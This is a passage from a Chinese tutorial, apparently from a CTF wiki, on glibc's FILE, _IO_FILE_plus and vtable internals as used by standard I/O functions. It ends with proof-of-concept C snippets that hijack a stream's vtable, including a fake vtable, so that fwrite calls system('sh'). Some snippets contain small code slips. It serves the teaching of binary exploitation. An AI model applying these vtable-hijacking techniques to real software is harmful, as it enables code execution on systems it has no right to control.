stdin\u3001stdout\u3001stderr\uff0c\u5206\u522b\u5bf9\u5e94\u6587\u4ef6\u63cf\u8ff0\u7b26\uff1a0\u30011\u30012 \u3002\u5047\u8bbe\u73b0\u5728\u7b2c\u4e00\u6b21\u7528 fopen \u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u8fd9\u4e2a\u6587\u4ef6\u6d41\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u5c31\u4e3a 3 \u3002\u9ed8\u8ba4\u6253\u5f00\u7684\u4e09\u4e2a\u6587\u4ef6\u6d41\u5206\u914d libc data \u6bb5\u3002fopen \u7b49\u6587\u4ef6\u6d41\u63a7\u5236\u51fd\u6570\u521b\u5efa\u7684\u6587\u4ef6\u6d41\u662f\u5206\u914d\u5728\u5806\u4e0a\u3002 FILE \u7ed3\u6784\u4f53\u5b9a\u4e49\u5728 libio.h \uff1a struct _IO_FILE { int _flags ; /* High-order word is _IO_MAGIC; rest is flags. */ #define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char * _IO_read_ptr ; /* Current read pointer */ char * _IO_read_end ; /* End of get area. */ char * _IO_read_base ; /* Start of putback+get area. */ char * _IO_write_base ; /* Start of put area. */ char * _IO_write_ptr ; /* Current put pointer. */ char * _IO_write_end ; /* End of put area. */ char * _IO_buf_base ; /* Start of reserve area. */ char * _IO_buf_end ; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char * _IO_save_base ; /* Pointer to start of non-current get area. */ char * _IO_backup_base ; /* Pointer to first valid character of backup area */ char * _IO_save_end ; /* Pointer to end of non-current get area. */ struct _IO_marker * _markers ; struct _IO_FILE * _chain ; int _fileno ; #if 0 int _blksize; #else int _flags2 ; #endif _IO_off_t _old_offset ; /* This used to be _offset but it's too small. */ #define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column ; signed char _vtable_offset ; char _shortbuf [ 1 ]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t * _lock ; #ifdef _IO_USE_OLD_IO_FILE }; \u6bcf\u4e2a\u6587\u4ef6\u6d41\u90fd\u6709\u81ea\u5df1\u7684 FILE \u7ed3\u6784\u4f53 \u3002\u6211\u4eec\u53ef\u4ee5\u5728 libc.so \u4e2d\u627e\u5230 stdin\\stdout\\stderr \u7b49\u7b26\u53f7\uff0c\u8fd9\u4e9b\u7b26\u53f7\u662f\u6307\u5411 FILE \u7ed3\u6784\u7684\u6307\u9488\uff0c\u771f\u6b63\u7ed3\u6784\u7684\u7b26\u53f7\u662f _IO_2_1_stderr_ _IO_2_1_stdout_ _IO_2_1_stdin_ \u5728 ida \u4e2d\u641c\u7d22 _IO_2_1_stdxxx_ \u6216\u8005 stdxx \u8fd9\u4e2a\u53d8\u91cf\u4f1a\u5b58\u50a8 FILE \u7ed3\u6784\u4f53\u5730\u5740\uff1a gdb \u8c03\u8bd5\u4e2d\u67e5\u770b\u7ed3\u6784\u4f53\u5185\u5bb9\uff1a \u8fdb\u7a0b\u4e2d\u7684 FILE \u7ed3\u6784\u4f1a\u901a\u8fc7 _chain \u57df\u5f7c\u6b64\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff08\u4e0a\u56fe\u53ef\u89c1\u6307\u5411 _IO_2_1_strout \uff09\uff0c \u94fe\u8868\u5934\u90e8\u7528\u5168\u5c40\u53d8\u91cf _IO_list_all \u8868\u793a \uff0c\u901a\u8fc7\u8fd9\u4e2a\u503c\u6211\u4eec\u53ef\u4ee5\u904d\u5386\u6240\u6709\u7684 FILE \u7ed3\u6784\uff08FSOP \u653b\u51fb\u5229\u7528\u5230\u8fd9\u4e2a\u7279\u6027\uff09\u3002 _IO_FILE_plus \u7ed3\u6784 \u00b6 \u4f46\u662f\u4e8b\u5b9e\u4e0a _IO_FILE \u7ed3\u6784\u5916\u5305\u88f9\u7740\u53e6\u4e00\u79cd\u7ed3\u6784 _IO_FILE_plus \uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u91cd\u8981\u7684**\u6307\u9488 vtable \u6307\u5411\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\u6307\u9488**\u3002 \u5728 libc2.23 \u7248\u672c\u4e0b\uff0c32 \u4f4d\u7684 vtable \u504f\u79fb\u4e3a 0x94\uff0c64 \u4f4d\u504f\u79fb\u4e3a 0xd8 struct _IO_FILE_plus { _IO_FILE file ; _IO_jump_t * vtable ; } _IO_FILE_plus \u7ed3\u6784\u4f53&\u5404\u4e2a\u504f\u79fb\uff0c\u5f53\u4e2d 0x0 ~ 0xc4 \u5176\u5b9e\u5c31\u662f _IO_FILE \u7ed3\u6784\uff0c\u6700\u540e\u52a0\u4e0a vtable \u6307\u9488\u6307\u5411 _IO_jump_t \uff1a //p *((struct _IO_FILE_plus*)[\u5730\u5740]) 0x0 _flags 0x8 _IO_read_ptr 0x10 _IO_read_end 0x18 _IO_read_base 0x20 _IO_write_base 0x28 _IO_write_ptr 0x30 _IO_write_end 0x38 _IO_buf_base 0x40 _IO_buf_end 0x48 _IO_save_base 0x50 _IO_backup_base 0x58 _IO_save_end 0x60 _markers 0x68 _chain 0x70 _fileno 0x74 _flags2 0x78 _old_offset 0x80 _cur_column 0x82 _vtable_offset 0x83 _shortbuf 0x88 _lock //IO_FILE_complete 0x90 _offset 0x98 _codecvt 0xa0 _wide_data 0xa8 _freeres_list 0xb0 _freeres_buf 0xb8 __pad5 0xc0 _mode 0xc4 _unused2 0xd8 vtable _IO_jump_t \u7ed3\u6784 \u00b6 vtable \u662f _IO_jump_t \u7c7b\u578b\u7684\u6307\u9488\uff0c\u6307\u5411\u7684 _IO_jump_t \u7ed3\u6784\u4f53\u4e2d\u4fdd\u5b58\u4e86\u4e00\u5806\u51fd\u6570\u6307\u9488\uff0c\u8fd9\u6709\u70b9\u50cf c++ \u7684\u865a\u51fd\u6570\u7ed3\u6784\u4f53\uff0c\u5728\u540e\u9762\u6211\u4eec\u4f1a\u770b\u5230\u5728\u4e00\u7cfb\u5217\u6807\u51c6 IO \u51fd\u6570\u4e2d\u4f1a\u8c03\u7528\u8fd9\u91cc\u9762\u7684\u51fd\u6570\u6307\u9488\u3002 \u5728 ida \u4e2d\u53ef\u4ee5\u627e _IO_2_1_stderr_ \u7ed3\u6784\u4f53\u540e\u9762\u7684 dq offset _IO_file_jumps \u8df3\u8f6c\u5230\u7ed3\u6784\u4f53\u3002\u6216\u8005\u76f4\u63a5\u641c\u7d22 _IO_file_jumps \uff0cvtable \u5b9e\u9645\u6307\u5411\u7684\u7ed3\u6784\u4f53\u540d\u5b57\u3002 //p *((struct _IO_jump_t*)[\u5730\u5740]) void * funcs [] = { JUMP_FIELD ( size_t , __dummy ); JUMP_FIELD ( size_t , __dummy2 ); JUMP_FIELD ( _IO_finish_t , __finish ); JUMP_FIELD ( _IO_overflow_t , __overflow ); JUMP_FIELD ( _IO_underflow_t , __underflow ); JUMP_FIELD ( _IO_underflow_t , __uflow ); JUMP_FIELD ( _IO_pbackfail_t , __pbackfail ); /* showmany */ JUMP_FIELD ( _IO_xsputn_t , __xsputn ); JUMP_FIELD ( _IO_xsgetn_t , __xsgetn ); JUMP_FIELD ( _IO_seekoff_t , __seekoff ); JUMP_FIELD ( _IO_seekpos_t , __seekpos ); JUMP_FIELD ( _IO_setbuf_t , __setbuf ); JUMP_FIELD ( _IO_sync_t , __sync ); JUMP_FIELD ( _IO_doallocate_t , __doallocate ); JUMP_FIELD ( _IO_read_t , __read ); JUMP_FIELD ( _IO_write_t , __write ); JUMP_FIELD ( _IO_seek_t , __seek ); JUMP_FIELD ( _IO_close_t , __close ); JUMP_FIELD ( _IO_stat_t , __stat ); JUMP_FIELD ( _IO_showmanyc_t , __showmanyc ); JUMP_FIELD ( _IO_imbue_t , __imbue ); #if 0 get_column; set_column; #endif }; \u5c0f\u7ed3 \u00b6 stdin\u3001stdout\u3001stderr \u6587\u4ef6\u6d41\u4f4d\u4e8e libc.so \u7684\u6570\u636e\u6bb5\u3002\u800c\u6211\u4eec\u4f7f\u7528 fopen \u521b\u5efa\u7684\u6587\u4ef6\u6d41\u662f\u5206\u914d\u5728\u5806\u5185\u5b58\u4e0a stdin\u3001stdout\u3001stderr\uff0c\u5206\u522b\u5bf9\u5e94\u6587\u4ef6\u63cf\u8ff0\u7b26\uff1a0\u30011\u30012 \uff0c\u5f00\u542f\u65b0\u7684\u6587\u4ef6\u6d41\u6587\u4ef6\u63cf\u8ff0\u7b26\u4ece 3 \u5f00\u59cb\u9012\u589e \u6bcf\u4e2a\u6587\u4ef6\u6d41\u90fd\u5355\u72ec\u7684 _IO_FILE \u3001_IO_FILE_plus \u7ed3\u6784\u4f53\uff0c _IO_jump_t *vtable \u53ea\u6709\u4e00\u4e2a\u5404\u4e2a\u6587\u4ef6\u6d41\u516c\u7528 \u6307\u9488 vtable \u6307\u5411\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\u6307\u9488\uff0c\u5404\u79cd IO \u64cd\u4f5c\u5747\u662f\u901a\u8fc7 vtable \u6307\u5411\u5404\u4e2a\u5177\u4f53\u51fd\u6570\u5b9e\u73b0\u529f\u80fd \u6587\u4ef6\u6d41\u901a\u8fc7 _chain \u6784\u6210\u94fe\u8868\uff0c \u94fe\u8868\u5934\u90e8\u7528\u5168\u5c40\u53d8\u91cf _IO_list_all \u8868\u793a ida \u4e2d\u901a\u8fc7\u641c\u7d22\u6587\u4ef6\u6d41\u540d\u53ef\u4ee5\u627e\u5230 _IO_FILE \u3001_IO_FILE_plus \uff0c\u6839\u636e\u504f\u79fb\uff08\u7ed3\u6784\u4f53\u6700\u540e\u4f4d\u7f6e\uff09\u627e\u5230 vtable \uff08eg: IO_2_1_stderr ) \u6d89\u53ca\u6587\u4ef6\u6d41\u90e8\u5206\u51fd\u6570 \u00b6 fread \u00b6 \u6d89\u53ca\u6e90\u7801\u6587\u4ef6\uff1a libio / iofread . c libio / genops . c libio / libioP . h libio / fileops . c fread \u662f\u6807\u51c6 IO \u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b size_t fread ( void * buffer , size_t size , size_t count , FILE * stream ) ; buffer \u5b58\u653e\u8bfb\u53d6\u6570\u636e\u7684\u7f13\u51b2\u533a\u3002 size\uff1a\u6307\u5b9a\u6bcf\u4e2a\u8bb0\u5f55\u7684\u957f\u5ea6\u3002 count\uff1a \u6307\u5b9a\u8bb0\u5f55\u7684\u4e2a\u6570\u3002 stream\uff1a\u76ee\u6807\u6587\u4ef6\u6d41\u3002 \u8fd4\u56de\u503c\uff1a\u8fd4\u56de\u8bfb\u53d6\u5230\u6570\u636e\u7f13\u51b2\u533a\u4e2d\u7684\u8bb0\u5f55\u4e2a\u6570 fread \u7684\u4ee3\u7801\u4f4d\u4e8e / libio/iofread.c \u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fread\uff0c\u4f46\u771f\u6b63\u7684\u529f\u80fd\u5b9e\u73b0\u5728\u5b50\u51fd\u6570_IO_sgetn \u4e2d\u3002 _IO_size_t _IO_fread ( buf , size , count , fp ) void * buf ; _IO_size_t size ; _IO_size_t count ; _IO_FILE * fp ; { ... bytes_read = _IO_sgetn ( fp , ( char * ) buf , bytes_requested ); ... } \u5728_IO_sgetn \u51fd\u6570\u4e2d\u4f1a\u8c03\u7528_IO_XSGETN\uff0c\u800c_IO_XSGETN \u662f_IO_FILE_plus.vtable \u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u5728*\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\u4f1a\u9996\u5148\u53d6\u51fa vtable \u4e2d\u7684\u6307\u9488\u7136\u540e\u518d\u8fdb\u884c\u8c03\u7528*\u3002 _IO_size_t _IO_sgetn ( fp , data , n ) _IO_FILE * fp ; void * data ; _IO_size_t n ; { return _IO_XSGETN ( fp , data , n ); } \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u51fd\u6570\u6307\u9488\u662f\u6307\u5411_IO_file_xsgetn \u51fd\u6570\u7684\uff0c if ( fp -> _IO_buf_base && want < ( size_t ) ( fp -> _IO_buf_end - fp -> _IO_buf_base )) { if ( __underflow ( fp ) == EOF ) break ; continue ; } fwrite \u00b6 \u6d89\u53ca\u6e90\u7801\u6587\u4ef6\uff1a libio / iofwrite . c libio / libioP . h libio / fileops . c fwrite \u540c\u6837\u662f\u6807\u51c6 IO \u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u5411\u6587\u4ef6\u6d41\u5199\u5165\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b size_t fwrite ( const void * buffer , size_t size , size_t count , FILE * stream ); buffer: \u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5bf9 fwrite \u6765\u8bf4\uff0c\u662f\u8981\u5199\u5165\u6570\u636e\u7684\u5730\u5740; size: \u8981\u5199\u5165\u5185\u5bb9\u7684\u5355\u5b57\u8282\u6570; count: \u8981\u8fdb\u884c\u5199\u5165 size \u5b57\u8282\u7684\u6570\u636e\u9879\u7684\u4e2a\u6570; stream: \u76ee\u6807\u6587\u4ef6\u6307\u9488; \u8fd4\u56de\u503c\uff1a\u5b9e\u9645\u5199\u5165\u7684\u6570\u636e\u9879\u4e2a\u6570 count\u3002 fwrite \u7684\u4ee3\u7801\u4f4d\u4e8e / libio/iofwrite.c \u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fwrite\u3002 \u5728_IO_fwrite \u4e2d\u4e3b\u8981\u662f\u8c03\u7528_IO_XSPUTN \u6765\u5b9e\u73b0\u5199\u5165\u7684\u529f\u80fd\u3002 \u6839\u636e\u524d\u9762\u5bf9_IO_FILE_plus \u7684\u4ecb\u7ecd\uff0c\u53ef\u77e5_IO_XSPUTN \u4f4d\u4e8e_IO_FILE_plus \u7684 vtable \u4e2d\uff0c\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u9996\u5148\u53d6\u51fa vtable \u4e2d\u7684\u6307\u9488\uff0c\u518d\u8df3\u8fc7\u53bb\u8fdb\u884c\u8c03\u7528\u3002 written = _IO_sputn ( fp , ( const char * ) buf , request ); \u5728_IO_XSPUTN \u5bf9\u5e94\u7684\u9ed8\u8ba4\u51fd\u6570_IO_new_file_xsputn \u4e2d\u4f1a\u8c03\u7528\u540c\u6837\u4f4d\u4e8e vtable \u4e2d\u7684_IO_OVERFLOW /* Next flush the (full) buffer. */ if ( _IO_OVERFLOW ( f , EOF ) == EOF ) _IO_OVERFLOW \u9ed8\u8ba4\u5bf9\u5e94\u7684\u51fd\u6570\u662f_IO_new_file_overflow if ( ch == EOF ) return _IO_do_write ( f , f -> _IO_write_base , f -> _IO_write_ptr - f -> _IO_write_base ); if ( f -> _IO_write_ptr == f -> _IO_buf_end ) /* Buffer is really full */ if ( _IO_do_flush ( f ) == EOF ) return EOF ; \u5728_IO_new_file_overflow \u5185\u90e8\u6700\u7ec8\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3 write \u51fd\u6570 fopen \u00b6 \u6d89\u53ca\u6e90\u7801\u6587\u4ef6\uff1a libio / iofopen . c libio / fileops . c libio / genops . c fopen \u5728\u6807\u51c6 IO \u5e93\u4e2d\u7528\u4e8e\u6253\u5f00\u6587\u4ef6\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b FILE * fopen ( char * filename , * type ); filename: \u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84 type: \u6253\u5f00\u65b9\u5f0f\u7684\u7c7b\u578b \u8fd4\u56de\u503c: \u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u6307\u9488 \u5728 fopen \u5185\u90e8\u4f1a\u521b\u5efa FILE \u7ed3\u6784\u5e76\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b \u9996\u5148\u5728 fopen \u5bf9\u5e94\u7684\u51fd\u6570__fopen_internal \u5185\u90e8\u4f1a\u8c03\u7528 malloc \u51fd\u6570\uff0c\u5206\u914d FILE \u7ed3\u6784\u7684\u7a7a\u95f4\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5 FILE \u7ed3\u6784\u662f\u5b58\u50a8\u5728\u5806\u4e0a\u7684 * new_f = ( struct locked_FILE * ) malloc ( sizeof ( struct locked_FILE )); \u4e4b\u540e\u4f1a\u4e3a\u521b\u5efa\u7684 FILE \u521d\u59cb\u5316 vtable\uff0c\u5e76\u8c03\u7528_IO_file_init \u8fdb\u4e00\u6b65\u521d\u59cb\u5316\u64cd\u4f5c _IO_JUMPS ( & new_f -> fp ) = & _IO_file_jumps ; _IO_file_init ( & new_f -> fp ); \u5728_IO_file_init \u51fd\u6570\u7684\u521d\u59cb\u5316\u64cd\u4f5c\u4e2d\uff0c\u4f1a\u8c03\u7528_IO_link_in \u628a\u65b0\u5206\u914d\u7684 FILE \u94fe\u5165_IO_list_all \u4e3a\u8d77\u59cb\u7684 FILE \u94fe\u8868\u4e2d void _IO_link_in ( fp ) struct _IO_FILE_plus * fp ; { if (( fp -> file . _flags & _IO_LINKED ) == 0 ) { fp -> file . _flags |= _IO_LINKED ; fp -> file . _chain = ( _IO_FILE * ) _IO_list_all ; _IO_list_all = fp ; ++ _IO_list_all_stamp ; } } \u4e4b\u540e__fopen_internal \u51fd\u6570\u4f1a\u8c03\u7528_IO_file_fopen \u51fd\u6570\u6253\u5f00\u76ee\u6807\u6587\u4ef6\uff0c_IO_file_fopen \u4f1a\u6839\u636e\u7528\u6237\u4f20\u5165\u7684\u6253\u5f00\u6a21\u5f0f\u8fdb\u884c\u6253\u5f00\u64cd\u4f5c\uff0c\u603b\u4e4b\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3 open \u51fd\u6570\uff0c\u8fd9\u91cc\u4e0d\u518d\u6df1\u5165\u3002 if ( _IO_file_fopen (( _IO_FILE * ) new_f , filename , mode , is32 ) != NULL ) return __fopen_maybe_mmap ( & new_f -> fp . file ); \u603b\u7ed3\u4e00\u4e0b fopen \u7684\u64cd\u4f5c\u662f \u4f7f\u7528 malloc \u5206\u914d FILE \u7ed3\u6784 \u8bbe\u7f6e FILE \u7ed3\u6784\u7684 vtable \u521d\u59cb\u5316\u5206\u914d\u7684 FILE \u7ed3\u6784 \u5c06\u521d\u59cb\u5316\u7684 FILE \u7ed3\u6784\u94fe\u5165 FILE \u7ed3\u6784\u94fe\u8868\u4e2d \u8c03\u7528\u7cfb\u7edf\u8c03\u7528\u6253\u5f00\u6587\u4ef6 fclose \u00b6 \u6d89\u53ca\u6e90\u7801\u6587\u4ef6\uff1a libio / iofclose . c fclose \u662f\u6807\u51c6 IO \u5e93\u4e2d\u7528\u4e8e\u5173\u95ed\u5df2\u6253\u5f00\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u5176\u4f5c\u7528\u4e0e fopen \u76f8\u53cd\u3002 int fclose ( FILE * stream ) \u529f\u80fd\uff1a\u5173\u95ed\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528 fclose \u5c31\u53ef\u4ee5\u628a\u7f13\u51b2\u533a\u5185\u6700\u540e\u5269\u4f59\u7684\u6570\u636e\u8f93\u51fa\u5230\u78c1\u76d8\u6587\u4ef6\u4e2d\uff0c\u5e76\u91ca\u653e\u6587\u4ef6\u6307\u9488\u548c\u6709\u5173\u7684\u7f13\u51b2\u533a fclose \u9996\u5148\u4f1a\u8c03\u7528_IO_unlink_it \u5c06\u6307\u5b9a\u7684 FILE \u4ece_chain \u94fe\u8868\u4e2d\u8131\u94fe if ( fp -> _IO_file_flags & _IO_IS_FILEBUF ) _IO_un_link (( struct _IO_FILE_plus * ) fp ); \u4e4b\u540e\u4f1a\u8c03\u7528_IO_file_close_it \u51fd\u6570\uff0c_IO_file_close_it \u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3 close \u5173\u95ed\u6587\u4ef6 if ( fp -> _IO_file_flags & _IO_IS_FILEBUF ) status = _IO_file_close_it ( fp ); \u6700\u540e\u8c03\u7528 vtable \u4e2d\u7684_IO_FINISH\uff0c\u5176\u5bf9\u5e94\u7684\u662f_IO_file_finish \u51fd\u6570\uff0c\u5176\u4e2d\u4f1a\u8c03\u7528 free \u51fd\u6570\u91ca\u653e\u4e4b\u524d\u5206\u914d\u7684 FILE \u7ed3\u6784 _IO_FINISH ( fp ); printf/puts \u00b6 printf \u548c puts \u662f\u5e38\u7528\u7684\u8f93\u51fa\u51fd\u6570\uff0c\u5728 printf \u7684\u53c2\u6570\u662f\u4ee5'\\n'\u7ed3\u675f\u7684\u7eaf\u5b57\u7b26\u4e32\u65f6\uff0cprintf \u4f1a\u88ab\u4f18\u5316\u4e3a puts \u51fd\u6570\u5e76\u53bb\u9664\u6362\u884c\u7b26\u3002 puts \u5728\u6e90\u7801\u4e2d\u5b9e\u73b0\u7684\u51fd\u6570\u662f_IO_puts\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u64cd\u4f5c\u4e0e fwrite \u7684\u6d41\u7a0b\u5927\u81f4\u76f8\u540c\uff0c\u51fd\u6570\u5185\u90e8\u540c\u6837\u4f1a**\u8c03\u7528 vtable \u4e2d\u7684_IO_sputn**\uff0c\u7ed3\u679c\u4f1a\u6267\u884c_IO_new_file_xsputn\uff0c\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3 write \u51fd\u6570\u3002 printf \u7684\u8c03\u7528\u6808\u56de\u6eaf\u5982\u4e0b\uff0c\u540c\u6837\u662f\u901a\u8fc7_IO_file_xsputn \u5b9e\u73b0 vfprintf + 11 _IO_file_xsputn _IO_file_overflow funlockfile _IO_file_write write \u4f2a\u9020 vtable \u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b \u00b6 \u4fee\u6539 vtable \u4e2d\u67d0\u4e9b\u51fd\u6570\u7684\u6307\u9488 >=libc 2.23 \u2192 \u901a\u8fc7\u4f2a\u9020 vtable \u7ed3\u6784\u4f53\u6765\u8c03\u7528\u67d0\u4e9b\u51fd\u6570\u7684\u6307\u9488 \u7b80\u4ecb \u00b6 IO \u64cd\u4f5c\u51fd\u6570\u9700\u8981\u7ecf\u8fc7 FILE \u7ed3\u6784\u8fdb\u884c\u5904\u7406\u3002\u5c24\u5176\u662f _IO_FILE_plus \u7ed3\u6784\u4e2d\u5b58\u5728 vtable\uff0c\u4e00\u4e9b\u51fd\u6570\u4f1a\u53d6\u51fa vtable \u4e2d\u7684\u6307\u9488\u8fdb\u884c\u8c03\u7528\u3002 \u56e0\u6b64\u4f2a\u9020 vtable \u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\u7684\u4e2d\u5fc3\u601d\u60f3\u5c31\u662f**\u9488\u5bf9_IO_FILE_plus \u7684 vtable \u52a8\u624b\u811a\uff0c\u901a\u8fc7\u628a vtable \u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u5e76\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u6765\u5b9e\u73b0\u3002** vtable \u52ab\u6301\u5206\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u6539\u5199 vtable \u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u5c31\u53ef\u4ee5\u5b9e\u73b0\u3002\u53e6\u4e00\u79cd\u662f\u8986\u76d6 vtable \u7684\u6307\u9488\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u7136\u540e\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u3002 \u539f\u7406\u793a\u4f8b \u00b6 \u4fee\u6539 vtable \u4e2d\u7684\u6307\u9488\uff0c int main ( void ) { FILE * fp ; long long * vtable_ptr ; fp = fopen ( \"123.txt\" , \"rw\" ); vtable_ptr =* ( long long * )(( long long ) fp + 0xd8 ); //get vtable vtable_ptr [ 7 ] = 0x41414141 //xsputn printf ( \"call 0x41414141\" ); } \u6839\u636e vtable \u5728 _IO_FILE_plus \u7684\u504f\u79fb\u5f97\u5230 vtable \u7684\u5730\u5740\uff0c\u5728 64 \u4f4d\u7cfb\u7edf\u4e0b\u504f\u79fb\u662f 0xd8\u3002\u4e4b\u540e\u641e\u6e05\u695a\u52ab\u6301\u7684 IO \u51fd\u6570\u4f1a\u8c03\u7528 vtable \u4e2d\u7684\u54ea\u4e2a\u865a\u51fd\u6570\u3002vtable \u51fd\u6570\u8fdb\u884c\u8c03\u7528\u65f6\uff0c\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5176\u5b9e\u662f\u5bf9\u5e94\u7684 _IO_FILE_plus \u5730\u5740\u3002\u6bd4\u5982\u8c03\u7528 printf \uff0c\u4f20\u9012\u7ed9 vtable \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f _IO_2_1_stdout_ \u7684\u5730\u5740\u3002\u5229\u7528\u8fd9\u70b9\u53ef\u4ee5\u5b9e\u73b0\u7ed9\u52ab\u6301\u7684 vtable \u51fd\u6570\u4f20\u53c3\uff0c\u6bd4\u5982 #define system_ptr 0x7ffff7a52390; int main ( void ) { FILE * fp ; long long * vtable_ptr ; fp = fopen ( \"123.txt\" , \"rw\" ); vtable_ptr =* ( long long * )(( long long ) fp + 0xd8 ); //get vtable memcopy ( fp , \"sh\" , 3 ); vtable_ptr [ 7 ] = system_ptr //xsputn fwrite ( \"hi\" , 2 , 1 , fp ); } \u4f46\u662f\u5728\u76ee\u524d libc2.23 \u7248\u672c\u4e0b\uff0c\u4f4d\u4e8e libc \u6570\u636e\u6bb5\u7684 vtable \u662f\u4e0d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u7684 \u3002\u4e0d\u8fc7\uff0c\u901a\u8fc7\u5728\u53ef\u63a7\u7684\u5185\u5b58\u4e2d\u4f2a\u9020 vtable \u7684\u65b9\u6cd5\u4f9d\u7136\u53ef\u4ee5\u5b9e\u73b0\u5229\u7528\u3002 #define system_ptr 0x7ffff7a52390; int main ( void ) { FILE * fp ; long long * vtable_addr , * fake_vtable ; fp = fopen ( \"123.txt\" , \"rw\" ); fake_vtable = malloc ( 0x40 ); vtable_addr = ( long long * )(( long long ) fp + 0xd8 ); //vtable offset vtable_addr [ 0 ] = ( long long ) fake_vtable ; memcpy ( fp , \"sh\" , 3 ); fake_vtable [ 7 ] = system_ptr ; //xsputn fwrite ( \"hi\" , 2 , 1 , fp ); } \u6211\u4eec\u9996\u5148\u5206\u914d\u4e00\u6b3e\u5185\u5b58\u6765\u5b58\u653e**\u4f2a\u9020\u7684 vtable\uff0c\u4e4b\u540e\u4fee\u6539 _IO_FILE_plus \u7684 vtable \u6307\u9488\u6307\u5411\u8fd9\u5757\u5185\u5b58**\u3002\u56e0\u4e3a vtable \u4e2d\u7684\u6307\u9488\u6211\u4eec\u653e\u7f6e\u7684\u662f system \u51fd\u6570\u7684\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u4f20\u9012\u53c2\u6570 \"/bin/sh\" \u6216 \"sh\"\u3002 \u56e0\u4e3a vtable \u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684 _IO_FILE_plus \u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u628a \"sh\" \u5199\u5165 _IO_FILE_plus \u5934\u90e8 \u3002\u4e4b\u540e\u5bf9 fwrite \u7684\u8c03\u7528\u5c31\u4f1a\u7ecf\u8fc7\u6211\u4eec\u4f2a\u9020\u7684 vtable \u6267\u884c system(\"sh\")\u3002 \u540c\u6837\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u4e0d\u5b58\u5728 fopen \u7b49\u51fd\u6570\u521b\u5efa\u7684 _IO_FILE \u65f6\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9 stdin\\stdout\\stderr \u7b49\u4f4d\u4e8e libc.so \u4e2d\u7684 _IO_FILE \uff0c\u8fd9\u4e9b\u6d41\u5728 printf\\scanf \u7b49\u51fd\u6570\u4e2d\u5c31\u4f1a\u88ab\u4f7f\u7528\u5230\u3002\u5728 libc2.23 \u4e4b\u524d\uff0c\u8fd9\u4e9b vtable \u662f\u53ef\u4ee5\u5199\u5165\u5e76\u4e14\u4e0d\u5b58\u5728\u5176\u4ed6\u68c0\u6d4b\u7684\u3002 print &_IO_2_1_stdin_ $2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 <_IO_2_1_stdin_> 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so \u5c0f\u7ed3 \u00b6 vtable \u52ab\u6301\u5206\u4e3a\u4e24\u79cd\uff1a 